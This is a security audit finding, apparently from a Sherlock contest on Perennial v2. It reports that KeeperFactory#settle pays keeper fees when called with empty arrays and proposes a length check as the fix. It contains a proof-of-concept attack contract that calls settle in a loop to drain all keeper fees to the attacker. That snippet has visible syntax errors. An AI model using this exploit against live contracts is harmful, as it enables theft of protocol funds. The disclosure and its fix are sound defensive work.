Gorgeous Oily Salmon

high

# Attacker can call `KeeperFactory#settle` with empty arrays as input parameters to steal all keeper fees

## Summary
Anyone can call `KeeperFactory#request`, inputting empty arrays as parameters, and the call will succeed, and the caller receives a fee.

Attacker can perform this attack many times within a loop to steal ALL keeper fees from protocol.

## Vulnerability Detail
### Expected Workflow:

- User calls [`Market#update`](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L80) to open a new position
- Market calls [`Oracle#request`](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial/contracts/Market.sol#L369) to request a new oracleVersion
  - The User's account [gets added](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperOracle.sol#L83) to a callback array of the market
- Once new oracleVersion gets [committed](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperFactory.sol#L163), keepers can call [`KeeperFactory#settle`](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperFactory.sol#L202), which will call [`Market#update`](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperOracle.sol#L177) on accounts in the Market's callback array, and [pay](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperFactory.sol#L204) the keeper(i.e. caller) a fee.
  - KeeperFactory#settle call [will fail](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperOracle.sol#L137-L139) if there is no account to settle(i.e. if callback array is empty)
  - After [`settle`ing](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperOracle.sol#L143) an account, it gets [removed](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperOracle.sol#L144) from the callback array

### The issue:

Here is [KeeperFactory#settle](https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperFactory.sol#L202-L217) function:

```solidity
function settle(bytes32[] memory ids, IMarket[] memory markets, uint256[] memory versions, uint256[] memory maxCounts)
    external
    keep(settleKeepConfig(), msg.data, 0, "")
{
    if (
        ids.length != markets.length ||
        ids.length != versions.length ||
        ids.length != maxCounts.length ||
        // Prevent calldata stuffing
        abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length != msg.data.length
    )
        revert KeeperFactoryInvalidSettleError();

    for (uint256 i; i < ids.length; i++)
        IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]);
}

```

As we can see, function does not check if the length of the array is 0, so if user inputs empty array, the for loop will not be entered, but the keeper still receives a fee via the `keep` modifier.

Attacker can have a contract perform the attack multiple times in a loop to drain all fees:

```solidity
interface IKeeperFactory{
    function settle(bytes32[] memory ids,IMarket[] memory markets,uint256[] memory versions,uint256[] memory maxCounts
    ) external;
}

interface IMarket(
    function update()external;
)

contract AttackContract{

    address public attacker;
    address public keeperFactory;
    IERC20 public keeperToken;

    constructor(address perennialDeployedKeeperFactory, IERC20 _keeperToken){
        attacker=msg.sender;
        keeperFactory=perennialDeployedKeeperFactory;
        keeperToken=_keeperToken;
    }

    function attack()external{
        require(msg.sender==attacker,"not allowed");

        bool canSteal=true;

        // empty arrays as parameters
        bytes32[] memory ids=[];
        IMarket[] memory markets=[];
        uint256[] versions=[];
        uint256[] maxCounts=[];

        // perform attack in a loop till all funds are drained or call reverts
        while(canSteal){
            try IKeeperFactory(keeperFactory).settle(ids,markets,versions,maxCounts){
                //
            }catch{
                canSteal=false;
            }
        }
        keeperToken.transfer(msg.sender, keeperToken.balanceOf(address(this)));
    }
}
```

## Impact
All keeper fees can be stolen from protocol, and there will be no way to incentivize Keepers to commitRequested oracle version, and other keeper tasks

## Code Snippet
https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperFactory.sol#L206-L212
## Tool used

Manual Review

## Recommendation
Within KeeperFactory#settle function, revert if `ids.length==0`:

```solidity
function settle(
    bytes32[] memory ids,
    IMarket[] memory markets,
    uint256[] memory versions,
    uint256[] memory maxCounts
)external keep(settleKeepConfig(), msg.data, 0, "") {
    if (
++++    ids.length==0 ||
        ids.length != markets.length ||
        ids.length != versions.length ||
        ids.length != maxCounts.length ||
        // Prevent calldata stuffing
        abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length != msg.data.length
    ) revert KeeperFactoryInvalidSettleError();

    for (uint256 i; i < ids.length; i++)
        IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]);
}
```